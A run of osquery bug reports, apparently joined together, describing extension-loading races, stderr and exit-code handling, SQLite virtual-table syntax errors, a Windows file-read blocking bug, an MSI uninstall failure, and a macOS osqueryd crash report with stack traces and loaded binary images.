2) treat any stderr content as failure given that we need to treat the presence of any stderr data as an error, we need to filter out warning level logs (via --logger_min_(status|stderr)=2)
for our use-case, info logging can be filtered out, but warning logs may be useful to collect (even if we still choose to treat the query as successful)
osqueryi should be returning a non-zero error code to indicate query failure (e.g., non-existent table, non-existent column, etc.).
in the extension path which makes registry call
std::string registryinterface::getactive() const { readlock lock(mutex_); return active_; <-- this is returend as empty, hence the error
} which eventually ends up showing the error
"no registry item name specified".
in the case when extensions register before query results are returned, the process just hangs and multiple `ctrl+c` key presses are needed to terminate the process.
when i added some logging i noticed that some of the tables, like `processes`, were using a query with `without rowid` and failing with a `syntax error near without`.
the sqlite manual always says ([here]( and [here]( that `create table` not `create virtual table` can use `without rowid` and, for virtual tables at least, inside `sqlite3_declare_vtab`, not `sqlite3_exec`
also since it seems all our tables are eponymous, meaning that xcreate=xconnect, so they could be referred to using the module name, a `create virtual table` is also not really necessary, unless we want to control when to call xcreate the first time.
if that's the case, do we really need to specify all the columns and types in the query? since our tables are eponymous and due to what's written in the `create virtual table` [manual]( it's possible to create a query without any module argument, like
`create virtual table temp.processes using processes()`, and the xcreate method will be called correctly
i did a quick test and it seemed the case since our implementation of xcreate seems to take the columns definitions from the spec, not from parsing the query
last but not least, is there a specific reason why we create tables under the `temp` schema, even if they are eponymous and already present in the `main` one?
i believe that the fact that they are eponymous makes everything "work" and this issue not being noticed, but the side effect is that xcreate is called delayed, when a query is done against the table
sorry if it's a bit loaded, but i think it's worth to look into the issues all together, unless we deem they are somewhat unrelated.
extension found, ext mgr started, but query ran before extension loaded and registered (extension timeout/interval not respected).
> i0731 16:47:44.487181 17272 init.cpp:416] osquery initialized [version=3.3.2]
i0731 16:47:44.491226 17272 extensions.cpp:394] found autoloadable extension: c:\\osquery_extension_testing\\tob.ext.exe
i0731 16:47:44.491226 17272 database.cpp:563] checking database version for migration
i0731 16:47:44.491226 17272 database.cpp:587] performing migration: 0 -> 1
i0731 16:47:44.491226 17272 database.cpp:619] migration 0 -> 1 successfully completed!
i0731 16:47:44.491226 17272 database.cpp:587] performing migration: 1 -> 2
i0731 16:47:44.492197 17272 database.cpp:619] migration 1 -> 2 successfully completed!
i0731 16:47:44.492197 13576 interface.cpp:265] extension manager service starting: \\\\.\\pipe\\shell.em
i0731 16:47:44.492197 17272 auto_constructed_tables.cpp:86] removing stale atc entries
i0731 16:47:44.493197 17272 killswitch.cpp:60] enum osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0731 16:47:44.493197 17272 init.cpp:688] error reading config: config file does not exist: \\programdata\\osquery\\osquery.conf
i0731 16:47:44.493197 17272 killswitch.cpp:60] enum osquery::killswitch::isenablederror 1 (cannot call registry item: )
i0731 16:47:44.501221 13704 watcher.cpp:629] created and monitoring extension child (2152): c:\\osquery_extension_testing\\tob.ext.exe
error: no such table: hostblacklist using > --extensions_require=<path_to_extensions> is a workaround, but listing all extensions i want to use on the command-line when they're already listed in the autoload file is far from ideal
i would expect these "run-one-query-and-exit" scenarios to load and allow extensions to register prior to running the query received via command-line.
when invoking osqueryi (shell) with the following command line, the attached stderr and stdout are produced: [stderr.txt](
[stdout.txt]( the logging (see stderr.txt) shows that the extensions (trailofbits_osquery_extensions) are successfully loaded and registered, but the osqueryi's initialization function claims that extension load failed
this is clearly wrong, since expected query results were returned and extension tables were successfully registered
this is problematic for our use-case due to osqueryi not setting a return code in some(all?) common error cases (e.g., bad table name, syntax error, etc.); we rely on 1) filtering out info/warning logs and 2) the stderr pipe being clear in order to confirm that a query was successful
**update: new issue didn't take me to the template-selection screen
updating with bug-template format.**
the test failing in order, what's happening:
the test calls the following readfile overload, without specifying the `blocking` argument:
#l173-l192
while trying to read the test_noninline_packs.conf.
worth to noting that if `blocking` is not specified, its default value is `false`
this means that the call is async, and has a blocksize set.
the called readfile function has the real implementation, and doesn't check the `blocking` argument, but it uses to configure the file handle:
#l98
which then sets the mode to pf_nonblock and initializes platformfile with it:
#l79-l80
#l84
and sets the windows platformfile `is_nonblock_` variable to true:
#l587-l589
the logic of readfile contains both the blocking and non-blocking implementation, but the `blocking` variable is not checked to decide which one to use:
#l134
given that the call came in with `blocking` to false but the `block_size` set, readfile takes the blocking path but with a handle that's configured for non-blocking usage
on windows this causes the specific implementation of the platformfile `read` function to use getoverlappedresult which can sometimes return an error_io_incomplete when the readfile request hasn't completed yet.
the `read` implementation exits with a return value of -1 when this happens, and so the readfile function exits early:
#l141-l142
#l153 there are also cases where the non-blocking path is called when the blocking one was configured in the handle
this could also be a problem on linux.
osquery did not show as an installed program in appwiz after running the msi, although the service is installed and process is running regularly
when trying to use the msi to uninstall i saw the following message :
this patch package could not be opened
verify that the patch package exists and that you can access it, or contact the application vendor to verify that this is a valid windows installer patch package
when trying to use the uninstall string i see this message:
`this action is only valid for products that are currently installed`
the results returning in subsets each time.
below is a typical crash report from these crashes
some of the crashes have `ioserviceaddmatchingnotification + 34` at the top of the stack trace rather than `ioserviceaddinterestnotification + 40` as soon as i get a hold of an example of that i'll post it here as well
i've surveyed various users of the affected systems and haven't found anything in common as far as hardware/peripheral devices go, i'll continue to investigate that
process: osqueryd [33476]
path: /usr/local/osqueryd
identifier: osqueryd
code type: x86-64 (native)
parent process: osqueryd [76]
responsible: osqueryd [33476]
user id: 0 date/time: 2019-03-04 07:05:16.243 -0500
os version: mac os x 10.14.3 (18d109)
report version: 12
bridge os version: 3.0 (14y674)
anonymous uuid: 70abd448-dc82-4360-59c2-8e4969041c11 sleep/wake uuid: 1b6a946d-3459-4f37-926d-0241bcfacdb7 time awake since boot: 97000 seconds
time since wake: 880 seconds system integrity protection: enabled crashed thread: 7 iokiteventpublisher exception type: exc_bad_access (sigsegv)
exception codes: kern_invalid_address at
exception note: exc_corpse_notify termination signal: segmentation fault: 11
termination reason: namespace signal, code
terminating process: exc handler [33476] vm regions near :
--> __text 0000000100056000-0000000100a09000 [ 9932k] r-x/rwx sm=cow /usr/local/osqueryd application specific information:
dyld2 mode thread 0:: dispatch queue: com.apple.main-thread
0 libsystem_kernel.dylib __ulock_wait + 10
1 libsystem_pthread.dylib _pthread_join + 356
2 libc++.1.dylib std::__1::thread::join() + 24
3 osqueryd + 5612406
4 osqueryd + 5407724
5 osqueryd + 5184847
6 osqueryd + 5191195
7 libdyld.dylib start + 1 thread 1:
0 libsystem_kernel.dylib __psynch_cvwait + 10
1 libsystem_pthread.dylib _pthread_cond_wait + 724
2 libc++.1.dylib std::__1::condition_variable::wait(std::__1::unique_lock<std::__1::mutex>&) + 18
3 osqueryd + 4781771
4 osqueryd + 4782531
5 osqueryd + 4787980
6 libsystem_pthread.dylib _pthread_body + 126
7 libsystem_pthread.dylib _pthread_start + 70
8 libsystem_pthread.dylib thread_start + 13 thread 2:
0 libsystem_kernel.dylib __psynch_cvwait + 10
1 libsystem_pthread.dylib _pthread_cond_wait + 724
2 libc++.1.dylib std::__1::condition_variable::wait(std::__1::unique_lock<std::__1::mutex>&) + 18
3 osqueryd + 4781771
4 osqueryd + 4782531
5 osqueryd + 4787980
6 libsystem_pthread.dylib _pthread_body + 126
7 libsystem_pthread.dylib _pthread_start + 70
8 libsystem_pthread.dylib thread_start + 13 thread 3:
0 libsystem_kernel.dylib __psynch_cvwait + 10
1 libsystem_pthread.dylib _pthread_cond_wait + 724
2 libc++.1.dylib std::__1::condition_variable::wait(std::__1::unique_lock<std::__1::mutex>&) + 18
3 osqueryd + 4781771
4 osqueryd + 4782531
5 osqueryd + 4787980
6 libsystem_pthread.dylib _pthread_body + 126
7 libsystem_pthread.dylib _pthread_start + 70
8 libsystem_pthread.dylib thread_start + 13 thread 4:
0 libsystem_kernel.dylib __psynch_cvwait + 10
1 libsystem_pthread.dylib _pthread_cond_wait + 724
2 libc++.1.dylib std::__1::condition_variable::wait(std::__1::unique_lock<std::__1::mutex>&) + 18
3 osqueryd + 4781771
4 osqueryd + 4782531
5 osqueryd + 4787980
6 libsystem_pthread.dylib _pthread_body + 126
7 libsystem_pthread.dylib _pthread_start + 70
8 libsystem_pthread.dylib thread_start + 13 thread 5:: diskarbitrationeventpublisher
0 libsystem_kernel.dylib __psynch_cvwait + 10
1 libsystem_pthread.dylib _pthread_cond_wait + 724
2 libc++.1.dylib std::__1::condition_variable::__do_timed_wait(std::__1::unique_lock<std::__1::mutex>&, std::__1::chrono::time_point<std::__1::chrono::system_clock, std::__1::chrono::duration<long long, std::__1::ratio<1l, 1000000000l> > >) + 93
3 osqueryd + 5570359
4 osqueryd + 5570140
5 osqueryd + 5607209
6 osqueryd + 5630884
7 libsystem_pthread.dylib _pthread_body + 126
8 libsystem_pthread.dylib _pthread_start + 70
9 libsystem_pthread.dylib thread_start + 13 thread 6:: fseventseventpublisher
0 libsystem_kernel.dylib __psynch_cvwait + 10
1 libsystem_pthread.dylib _pthread_cond_wait + 724
2 libc++.1.dylib std::__1::condition_variable::__do_timed_wait(std::__1::unique_lock<std::__1::mutex>&, std::__1::chrono::time_point<std::__1::chrono::system_clock, std::__1::chrono::duration<long long, std::__1::ratio<1l, 1000000000l> > >) + 93
3 osqueryd + 5570359
4 osqueryd + 5570140
5 osqueryd + 5607209
6 osqueryd + 5630884
7 libsystem_pthread.dylib _pthread_body + 126
8 libsystem_pthread.dylib _pthread_start + 70
9 libsystem_pthread.dylib thread_start + 13 thread 7 crashed:: iokiteventpublisher
0 com.apple.framework.iokit ioserviceaddinterestnotification + 40
1 osqueryd + 6605280
2 osqueryd + 6610753
3 osqueryd + 5607151
4 osqueryd + 5630884
5 libsystem_pthread.dylib _pthread_body + 126
6 libsystem_pthread.dylib _pthread_start + 70
7 libsystem_pthread.dylib thread_start + 13 thread 8:: openbsmeventpublisher
0 libsystem_kernel.dylib __read_nocancel + 10
1 libsystem_c.dylib _sread + 16
2 libsystem_c.dylib __srefill1 + 24
3 libsystem_c.dylib __srget + 14
4 libsystem_c.dylib fgetc + 52
5 libbsm.0.dylib au_read_rec + 28
6 osqueryd + 6616340
7 osqueryd + 5607151
8 osqueryd + 5630884
9 libsystem_pthread.dylib _pthread_body + 126
10 libsystem_pthread.dylib _pthread_start + 70
11 libsystem_pthread.dylib thread_start + 13 thread 9:
0 libsystem_pthread.dylib start_wqthread + 0
1 ??? 0 + 1414025796 thread 10:
0 libsystem_pthread.dylib start_wqthread + 0
1 ??? 0 + 2307 thread 7 crashed with x86 thread state (64-bit): rax: rbx: rcx: rdx: rdi: rsi: rbp: rsp: r8: r9: r10: r11: r12: r13: r14: r15: rip: rfl: cr2: logical cpu: 4
error code:
trap number: 14 binary images: - +osqueryd (0) <f8eca696-dde7-3f7a-a60e-88b092718551> /usr/local/osqueryd - dyld (655.1) <3eba447f-a546-366b-b302-8dc3b21a3e30> /usr/lib/dyld - com.apple.accelerate (1.11 - accelerate 1.11) <a09cb6d5-3f8a-3e05-b0eb-63878296a059> /system/library/frameworks/accelerate.framework/versions/a/accelerate - com.apple.vimage (8.1 - ???) <bda40eb0-9b20-3acf-be37-199578fa84f4> /system/library/frameworks/accelerate.framework/versions/a/frameworks/vimage.framework/versions/a/vimage - libblas.dylib (1243.200.4) <0adbeae3-6636-33e5-ac9f-11c2249e19d3> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libblas.dylib - libbnns.dylib (38.200.5) <cc93b9b5-2a8c-3d42-9234-75dd41ec8c0d> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libbnns.dylib - liblapack.dylib (1243.200.4) <45722a8a-5788-3c4c-add9-1812763fa635> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/liblapack.dylib - liblinearalgebra.dylib (1243.200.4) <3923ab79-213e-32fd-ac87-8b1a1a832336> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/liblinearalgebra.dylib - libquadrature.dylib (3.200.2) <4fbcac0a-81a4-3c53-8458-27f3569c809d> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libquadrature.dylib - libsparse.dylib (79.200.5) <2d650c50-e87e-3f24-9bfa-c8eb6de1a6e9> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libsparse.dylib - libsparseblas.dylib (1243.200.4) <6f8c78be-a0fd-3507-8a95-541afc57f1ee> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libsparseblas.dylib - libvdsp.dylib (671.220.1) <2f576522-08b1-3c65-8f00-3427e938adda> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libvdsp.dylib - libvmisc.dylib (671.220.1) <d7b5f89d-3310-31f4-b8bf-42da300abe64> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/libvmisc.dylib - com.apple.accelerate.veclib (3.11 - veclib 3.11) <221e4fef-0431-3316-8281-22b6f8315a09> /system/library/frameworks/accelerate.framework/versions/a/frameworks/veclib.framework/versions/a/veclib - com.apple.applicationservices (50.1 - 50.1) <86d6f10e-21f8-3cdc-9838-eb07a1c54ba9> /system/library/frameworks/applicationservices.framework/versions/a/applicationservices - com.apple.applicationservices.ats (377 - 453.11) <4080f8be-f2a2-3707-8754-436fbdb1daf1> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/ats.framework/versions/a/ats - libfontparser.dylib (228.6) <bbcbee2c-5b55-3278-b81d-22d72466753e> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/ats.framework/versions/a/resources/libfontparser.dylib - libfontregistry.dylib (228.12.1.1) <b515718c-81bc-3705-a207-7215486c6d28> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/ats.framework/versions/a/resources/libfontregistry.dylib - com.apple.colorsynclegacy (4.13.0 - 1) <4b1238cc-9b77-3aa5-8329-ee3c736f07ea> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/colorsynclegacy.framework/versions/a/colorsynclegacy - com.apple.hiservices (1.22 - 627.14.2) <1f851bf9-ad29-3558-9ea5-aad9baaac823> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/hiservices.framework/versions/a/hiservices - com.apple.langanalysis (1.7.0 - 1.7.0) <5654723a-7b3b-391f-b9f7-0de4d5940185> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/langanalysis.framework/versions/a/langanalysis - com.apple.print.framework.printcore (14.2 - 503.8) <f1246c9a-2216-3390-8df1-89304f47ce5d> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/printcore.framework/versions/a/printcore - com.apple.qd (3.12 - 407.2) <f6b648da-da39-3eb4-b593-1b7e316661cd> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/qd.framework/versions/a/qd - com.apple.speech.synthesis.framework (8.1.0 - 8.1.0) <cf19c8b6-aad5-3dcf-abd0-3babb44d119c> /system/library/frameworks/applicationservices.framework/versions/a/frameworks/speechsynthesis.framework/versions/a/speechsynthesis - com.apple.audio.toolbox.audiotoolbox (1.14 - 1.14) <5d484151-f269-3d98-b507-0544a6b950ac> /system/library/frameworks/audiotoolbox.framework/versions/a/audiotoolbox - com.apple.cfnetwork (976 - 976) <a434842f-305b-301d-8f88-373ca7bf7196> /system/library/frameworks/cfnetwork.framework/versions/a/cfnetwork - com.apple.colorsync (4.13.0 - 3340) <2f45eb01-0c51-3d25-9836-18f99222e1c7> /system/library/frameworks/colorsync.framework/versions/a/colorsync - com.apple.audio.coreaudio (4.3.0 - 4.3.0) <1e7ef105-b843-370d-884e-0a43e1a5800b> /system/library/frameworks/coreaudio.framework/versions/a/coreaudio - com.apple.coredata (120 - 866.1) <18cd58fd-513e-385b-b43c-08eeb909709c> /system/library/frameworks/coredata.framework/versions/a/coredata - com.apple.coredisplay (101.3 - 106.2) <ee0d334b-8b71-3a70-9f90-677171d6762f> /system/library/frameworks/coredisplay.framework/versions/a/coredisplay - com.apple.corefoundation (6.9 - 1562) <02a2c178-9ff6-385c-a9c5-7f4fc9d66311> /system/library/frameworks/corefoundation.framework/versions/a/corefoundation - com.apple.coregraphics (2.0 - 1249.2) <78b75f62-4b60-3ff4-9259-8981e755f6cd> /system/library/frameworks/coregraphics.framework/versions/a/coregraphics - com.apple.coreimage (14.2.0 - 720.0.130) <b356ba95-edd3-35d8-9e4b-250af6c6ddf9> /system/library/frameworks/coreimage.framework/versions/a/coreimage - com.apple.coreservices (941 - 941) <6dba4791-26db-39fb-a6a3-5910a0f2edd2> /system/library/frameworks/coreservices.framework/versions/a/coreservices - com.apple.ae (771 - 771) <4b009524-699e-3891-98dd-e3b6bb433c8f> /system/library/frameworks/coreservices.framework/versions/a/frameworks/ae.framework/versions/a/ae - com.apple.coreservices.carboncore (1178.16 - 1178.16) <17fc2b9e-eb6c-3768-a2d0-6e086f2563d9> /system/library/frameworks/coreservices.framework/versions/a/frameworks/carboncore.framework/versions/a/carboncore - com.apple.dictionaryservices (1.2 - 284.16.3) <1dac9153-fb5a-3798-8797-cbfeff227f71> /system/library/frameworks/coreservices.framework/versions/a/frameworks/dictionaryservices.framework/versions/a/dictionaryservices - com.apple.coreservices.fsevents (1239.200.12 - 1239.200.12) <8e1507ea-f0a8-3845-b32d-4fbc1381e89c> /system/library/frameworks/coreservices.framework/versions/a/frameworks/fsevents.framework/versions/a/fsevents - com.apple.launchservices (941 - 941) <a8e42760-995c-35e2-bf4a-c96fd0633b29> /system/library/frameworks/coreservices.framework/versions/a/frameworks/launchservices.framework/versions/a/launchservices - com.apple.metadata (10.7.0 - 1191.53) <48609998-8a34-3caf-8a42-52c180809656> /system/library/frameworks/coreservices.framework/versions/a/frameworks/metadata.framework/versions/a/metadata - com.apple.coreservices.osservices (941 - 941) <1b9ea259-09df-332b-807a-bd50f3184cac> /system/library/frameworks/coreservices.framework/versions/a/frameworks/osservices.framework/versions/a/osservices - com.apple.searchkit (1.4.0 - 1.4.0) <cec29bb5-d28e-3424-84fe-70756e521f3b> /system/library/frameworks/coreservices.framework/versions/a/frameworks/searchkit.framework/versions/a/searchkit - com.apple.coreservices.sharedfilelist (71.27 - 71.27) <6389b59d-ddac-3c97-a982-137b9b1fb734> /system/library/frameworks/coreservices.framework/versions/a/frameworks/sharedfilelist.framework/versions/a/sharedfilelist - com.apple.coretext (352.0 - 584.26) <5f61037c-825d-37a4-9091-0047413cc213> /system/library/frameworks/coretext.framework/versions/a/coretext - com.apple.corevideo (1.8 - 0.0) <34ec73f1-f0ed-32f5-b96e-7683b1f9a7a2> /system/library/frameworks/corevideo.framework/versions/a/corevideo - com.apple.framework.corewlan (13.0 - 1370.8) <32426190-3455-3049-8c09-0ec04d9c1279> /system/library/frameworks/corewlan.framework/versions/a/corewlan - com.apple.diskarbitration (2.7 - 2.7) <97707a79-30e7-3d99-aa20-b992b0900bc4> /system/library/frameworks/diskarbitration.framework/versions/a/diskarbitration - com.apple.foundation (6.9 - 1562) <83d4a12b-ea5a-3c62-8d93-95e64f0a256b> /system/library/frameworks/foundation.framework/versions/c/foundation - com.apple.gss (4.0 - 2.0) <86d07291-5dfc-30c2-9a18-5fcedb0be621> /system/library/frameworks/gss.framework/versions/a/gss - com.apple.framework.iokit (2.0.2 - 1483.240.1) <241690bb-8afa-3b6a-a210-67874197cb59> /system/library/frameworks/iokit.framework/versions/a/iokit - com.apple.iosurface (255.1 - 255.1) <58826b1a-38e8-3c76-8ffc-76c9282da893> /system/library/frameworks/iosurface.framework/versions/a/iosurface - com.apple.imageio.framework (3.3.0 - 1822.1) <908907d5-5c29-32f7-acd9-c6a6d51c4d15> /system/library/frameworks/imageio.framework/versions/a/imageio - libgif.dylib (1822.1) <35e37b95-1962-3a25-9c9e-cadd161152b3> /system/library/frameworks/imageio.framework/versions/a/resources/libgif.dylib - libjp2.dylib (1822.1) <bdbcbf28-12db-3d63-b6f0-a559d1839f81> /system/library/frameworks/imageio.framework/versions/a/resources/libjp2.dylib - libjpeg.dylib (1822.1) <d443c754-4afc-38e1-9e45-d309acbce17b> /system/library/frameworks/imageio.framework/versions/a/resources/libjpeg.dylib - libpng.dylib (1822.1) <28fe6e2c-1a17-3a84-aaf3-76014deaddd4> /system/library/frameworks/imageio.framework/versions/a/resources/libpng.dylib - libradiance.dylib (1822.1) <687906e3-4ec2-3ce9-b7ea-34418239ee1b> /system/library/frameworks/imageio.framework/versions/a/resources/libradiance.dylib - libtiff.dylib (1822.1) <0a1c083b-ce2f-3a00-8e45-eb58dca2ff34> /system/library/frameworks/imageio.framework/versions/a/resources/libtiff.dylib - com.apple.kerberos (3.0 - 1) <5d1b0593-3c0e-32d5-aae5-abc22a98b639> /system/library/frameworks/kerberos.framework/versions/a/kerberos - com.apple.metal (158.5 - 158.5) <72bf7187-81fe-389b-882f-7b2587feb455> /system/library/frameworks/metal.framework/versions/a/metal - com.apple.metalperformanceshaders.mpscore (1.0 - 1) <18281b14-0c6a-38f8-ab80-2d4bb0743c88> /system/library/frameworks/metalperformanceshaders.framework/frameworks/mpscore.framework/versions/a/mpscore - com.apple.metalperformanceshaders.mpsimage (1.0 - 1) <beaf764b-362b-3c45-86f5-2afba5fa0f47> /system/library/frameworks/metalperformanceshaders.framework/frameworks/mpsimage.framework/versions/a/mpsimage - com.apple.metalperformanceshaders.mpsmatrix (1.0 - 1) <116d6c1a-2fd7-3743-95a0-cdda3d459529> /system/library/frameworks/metalperformanceshaders.framework/frameworks/mpsmatrix.framework/versions/a/mpsmatrix - com.apple.metalperformanceshaders.mpsneuralnetwork (1.0 - 1) <88e80bee-3d2b-328b-80d4-f4717bdb2e9f> /system/library/frameworks/metalperformanceshaders.framework/frameworks/mpsneuralnetwork.framework/versions/a/mpsneuralnetwork - com.apple.metalperformanceshaders.mpsrayintersector (1.0 - 1) <e0e652b0-1624-3435-ad60-83a9c4b59852> /system/library/frameworks/metalperformanceshaders.framework/frameworks/mpsrayintersector.framework/versions/a/mpsrayintersector - com.apple.metalperformanceshaders.metalperformanceshaders (1.0 - 1) <1bba8bc8-49c6-3c9b-b985-7ce4373e3553> /system/library/frameworks/metalperformanceshaders.framework/versions/a/metalperformanceshaders - com.apple.netfs (6.0 - 4.0) <918df6cd-2db0-36a8-b869-5ef637a06c0d> /system/library/frameworks/netfs.framework/versions/a/netfs - com.apple.opencl (2.15.1 - 2.15.1) <cc9439c3-ff30-38d2-bf2f-ea0ef1b5775e> /system/library/frameworks/opencl.framework/versions/a/opencl - com.apple.cfopendirectory (10.14 - 207.200.4) <2cb1f122-2fa0-347c-8454-9ce0fa150832> /system/library/frameworks/opendirectory.framework/versions/a/frameworks/cfopendirectory.framework/versions/a/cfopendirectory - com.apple.opendirectory (10.14 - 207.200.4) <a3fb0f0c-57f4-3f89-a4b1-63da1f7c9e8e> /system/library/frameworks/opendirectory.framework/versions/a/opendirectory - libcvmspluginsupport.dylib (17.3.1) <b2310175-04d6-378b-a220-a8ad7f0da68e> /system/library/frameworks/opengl.framework/versions/a/libraries/libcvmspluginsupport.dylib - libcorefscache.dylib (163.20) <566db80e-f1d6-3aec-af06-08955507afee> /system/library/frameworks/opengl.framework/versions/a/libraries/libcorefscache.dylib - libcorevmclient.dylib (163.20) <b9a89373-bdcd-3003-9a82-6d73b930a122> /system/library/frameworks/opengl.framework/versions/a/libraries/libcorevmclient.dylib - libgfxshared.dylib (17.3.1) <9ffa679a-8cc9-3932-8a41-aa80c386ad3a> /system/library/frameworks/opengl.framework/versions/a/libraries/libgfxshared.dylib - libgl.dylib (17.3.1) <cfab6ae4-e646-3e8a-b872-ef091caf949e> /system/library/frameworks/opengl.framework/versions/a/libraries/libgl.dylib - libglimage.dylib (17.3.1) <1aec8e56-d851-3516-96fe-2829883a8302> /system/library/frameworks/opengl.framework/versions/a/libraries/libglimage.dylib - libglu.dylib (17.3.1) <90279918-d4b2-31e0-9709-8e06628d9486> /system/library/frameworks/opengl.framework/versions/a/libraries/libglu.dylib - com.apple.opengl (17.3.1 - 17.3.1) <2f59064f-d6ef-35cd-9747-20a91db3d5df> /system/library/frameworks/opengl.framework/versions/a/opengl - com.apple.quartzcore (1.11 - 696.3) <01a2f065-8759-311d-ac2e-fd49f52a87fa> /system/library/frameworks/quartzcore.framework/versions/a/quartzcore - com.apple.security (7.0 - 58286.240.4) <91a03ff2-2ee9-36a7-ac4f-169e11fe7846> /system/library/frameworks/security.framework/versions/a/security - com.apple.securityfoundation (6.0 - 55185.200.14) <f6a0ec77-51db-3312-991c-3e1f920de8f1> /system/library/frameworks/securityfoundation.framework/versions/a/securityfoundation - com.apple.xpc.servicemanagement (1.0 - 1) <26ba237c-dba0-3322-b9bf-8b8e739e3a20> /system/library/frameworks/servicemanagement.framework/versions/a/servicemanagement - com.apple.systemconfiguration (1.17 - 1.17) <a8fd596e-c858-397f-836c-978038b97ac0> /system/library/frameworks/systemconfiguration.framework/versions/a/systemconfiguration - com.apple.apfs (1.0 - 1) <bcb42c90-dee0-3cd2-9b28-55cd8efd9487> /system/library/privateframeworks/apfs.framework/versions/a/apfs - com.apple.aggregatedictionary (1.0 - 1) <eba6443e-6cf0-34f6-b77a-3fcec57f8f80> /system/library/privateframeworks/aggregatedictionary.framework/versions/a/aggregatedictionary - com.apple.applefscompression (96.200.3 - 1.0) <78d538dd-1d24-34fc-afb3-10411494870d> /system/library/privateframeworks/applefscompression.framework/versions/a/applefscompression - com.apple.applejpeg (1.0 - 1) <ec4c49f1-c060-3c0f-910f-3620985d4f12> /system/library/privateframeworks/applejpeg.framework/versions/a/applejpeg - com.apple.applesauce (1.0 - ???) <58654bc0-9243-39d1-bc43-b7f2e37a3a44> /system/library/privateframeworks/applesauce.framework/versions/a/applesauce - com.apple.assertionservices (1.0 - 1) <3f767d20-fe14-35cf-a089-e0445375ecfb> /system/library/privateframeworks/assertionservices.framework/versions/a/assertionservices - com.apple.coreservices.backgroundtaskmanagement (1.0 - 57.1) <05cf66f0-9650-3f75-9857-f8d186043866> /system/library/privateframeworks/backgroundtaskmanagement.framework/versions/a/backgroundtaskmanagement - com.apple.baseboard (360.24 - 360.24) <04af4372-c5d3-3f0a-a688-68d888d6d138> /system/library/privateframeworks/baseboard.framework/versions/a/baseboard - com.apple.commonauth (4.0 - 2.0) <090893e5-bb65-39da-a174-eab2c7191efe> /system/library/privateframeworks/commonauth.framework/versions/a/commonauth - com.apple.coreemoji (1.0 - 69.19.8) <26bc0f82-08c1-3ebd-9299-d3cc5091c467> /system/library/privateframeworks/coreemoji.framework/versions/a/coreemoji - com.apple.corenlp (1.0 - 130.15.22) <d0a3e880-cdea-360a-9838-220d76baecc6> /system/library/privateframeworks/corenlp.framework/versions/a/corenlp - com.apple.framework.corewifi (13.0 - 1370.8) <818f8915-ba51-3145-9c40-c9b8d7be2dbd> /system/library/privateframeworks/corewifi.framework/versions/a/corewifi - com.apple.dsexternaldisplay (3.1 - 380) <76449d22-ba27-3fb1-ad25-a290936e6dea> /system/library/privateframeworks/dsexternaldisplay.framework/versions/a/dsexternaldisplay - com.apple.vision.facecore (3.3.4 - 3.3.4) <41218eb7-19c9-3813-a793-b0623387cadf> /system/library/privateframeworks/facecore.framework/versions/a/facecore - com.apple.gpuwrangler (3.28.4 - 3.28.4) <7e06c75d-5502-3f1d-987c-4f103917cd85> /system/library/privateframeworks/gpuwrangler.framework/versions/a/gpuwrangler - com.apple.graphvisualizer (1.0 - 5) <cafe626e-9738-3c14-88aa-b6a9182f2c39> /system/library/privateframeworks/graphvisualizer.framework/versions/a/graphvisualizer - com.apple.heimdal (4.0 - 2.0) <d99ff31f-6310-3d80-8ae3-64934385ac11> /system/library/privateframeworks/heimdal.framework/versions/a/heimdal - com.apple.ioaccelerator (404.2.2 - 404.2.2) <2f099589-dbe9-3442-ac93-f4ab363482a0> /system/library/privateframeworks/ioaccelerator.framework/versions/a/ioaccelerator - com.apple.iopresentment (1.0 - 42.6) <f7e91cc9-e4bb-3904-8647-0473e3bcaf70> /system/library/privateframeworks/iopresentment.framework/versions/a/iopresentment - com.apple.languagemodeling (1.0 - 159.15.15) <34609f31-4da1-3881-8947-85bea7afc938> /system/library/privateframeworks/languagemodeling.framework/versions/a/languagemodeling - com.apple.lexicon-framework (1.0 - 33.15.10) <07e008f3-e823-333b-8b41-a46024ab0561> /system/library/privateframeworks/lexicon.framework/versions/a/lexicon - com.apple.linguisticdata (1.0 - 238.23.4) <f6aa7095-3975-3c76-9833-bbe955efebd7> /system/library/privateframeworks/linguisticdata.framework/versions/a/linguisticdata - com.apple.spotlight.metadata.utilities (1.0 - 1191.53) <2cffd786-87a5-3629-b5e1-8e4def51ada8> /system/library/privateframeworks/metadatautilities.framework/versions/a/metadatautilities - com.apple.gpusw.metaltools (1.0 - 1) <c0489bbd-c25c-33e5-84cd-8a50205080a0> /system/library/privateframeworks/metaltools.framework/versions/a/metaltools - com.apple.multitouchsupport.framework (2410.5 - 2410.5) <3a712911-f672-3bb3-b62b-a2a7badf3578> /system/library/privateframeworks/multitouchsupport.framework/versions/a/multitouchsupport - com.apple.netauth (6.2 - 6.2) <a6474abc-fd4b-3a8f-ab33-7aaceeed7f0e> /system/library/privateframeworks/netauth.framework/versions/a/netauth - com.apple.otsvg (1.0 - ???) <f020144a-d840-390d-a87f-29e8095c78af> /system/library/privateframeworks/otsvg.framework/versions/a/otsvg - com.apple.skylight (1.600.0 - 337.5) <b18b2f6f-f44b-3b5b-8da1-3b8977e59240> /system/library/privateframeworks/skylight.framework/versions/a/skylight - com.apple.tcc (1.0 - 1) <81f88b91-49c1-36e7-8a39-c4bd654ee942> /system/library/privateframeworks/tcc.framework/versions/a/tcc - com.apple.loginsupport (1.0 - 1) <67bc49d6-320f-33ed-912e-16e5a342f385> /system/library/privateframeworks/login.framework/versions/a/frameworks/loginsupport.framework/versions/a/loginsupport - libcrfsuite.dylib (41.15.4) 